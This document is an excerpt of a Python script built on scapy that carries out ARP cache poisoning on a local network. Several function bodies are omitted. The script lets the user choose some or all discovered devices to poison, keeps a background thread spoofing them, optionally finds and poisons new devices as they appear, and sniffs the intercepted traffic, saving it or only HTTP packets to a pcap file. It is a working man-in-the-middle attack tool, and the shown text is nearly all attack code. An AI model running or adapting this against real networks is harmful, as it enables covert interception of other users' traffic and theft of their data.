...
def send_spoof_packets(targets, gateway_info):
...
def process_sniffed_pkt(pkt, http_only):
    ...
    if http_only:
        if pkt.haslayer(scapy.Raw) and b"HTTP" in pkt[scapy.Raw].load:
            print("Writing HTTP packet to pcap file. Press ctrl + c to exit.")
            scapy.wrpcap("requests.pcap", pkt, append=True)
    else:
        print("Writing packet to pcap file. Press ctrl + c to exit.")
        scapy.wrpcap("requests.pcap", pkt, append=True)

def print_arp_res(arp_res):
    """ The function takes in the arp responses and prints them out in a table-like structure so you 
    can select the devices you want to poison. """
    ...
    while True:
        try:
            # Allow the user to select multiple devices or all devices
            choice = input("Please select the IDs of the computers whose ARP caches you want to poison (comma-separated, e.g., 1,2,3) or type 'all' to select all devices (ctrl+z to exit): ")
            if choice.strip().lower() == "all":
                return list(range(len(arp_res)))
            selected_ids = [int(i) for i in choice.split(',')]
            if all(id < len(arp_res) for id in selected_ids):
                return selected_ids
        except:
...
# Show the menu and assign the choices from the function to the variable -> choices
choices = print_arp_res(client_info)

# Select the nodes to spoof from the client_info list.
nodes_to_spoof = [client_info[choice] for choice in choices]

# Ask if the user wants to keep discovering and ARP poisoning new devices
discover_new_devices = input("Do you want to keep discovering and ARP poisoning new devices? (yes/no): ").strip().lower() == "yes"

def continuous_scan_and_spoof():
    """ Continuously scan for new devices and ARP poison them """
    known_devices = set((node["ip"], node["mac"]) for node in nodes_to_spoof)
    while True:
        new_arp_res = arp_scan(ip_range)
        new_devices = []
        for device in new_arp_res:
            if (device["ip"], device["mac"]) not in known_devices:
                new_devices.append(device)
                known_devices.add((device["ip"], device["mac"]))
        if new_devices:
            print("New devices found, starting ARP poisoning:")
            for device in new_devices:
                print(f"IP: {device['ip']}, MAC: {device['mac']}")
            nodes_to_spoof.extend(new_devices)
        time.sleep(10)

# Ask the user if they want to save the captured traffic to a pcap file
save_pcap = input("Do you want to save the captured traffic to a pcap file? (yes/no): ").strip().lower() == "yes"

# Ask the user if they want to save only HTTP traffic to the pcap file
http_only = False
if save_pcap:
    http_only = input("Do you want to save only HTTP traffic to the pcap file? (yes/no): ").strip().lower() == "yes"

# Setup the thread in the background which will send the arp spoof packets.
t1 = threading.Thread(target=send_spoof_packets, args=(nodes_to_spoof, gateway_info), daemon=True)
# Start the thread.
t1.start()

# If the user wants to discover and ARP poison new devices, start another thread for continuous scanning and ARP poisoning
if discover_new_devices:
    t2 = threading.Thread(target=continuous_scan_and_spoof, daemon=True)
    t2.start()
...
packet_sniffer(gateway_info["iface"], save_pcap, http_only)
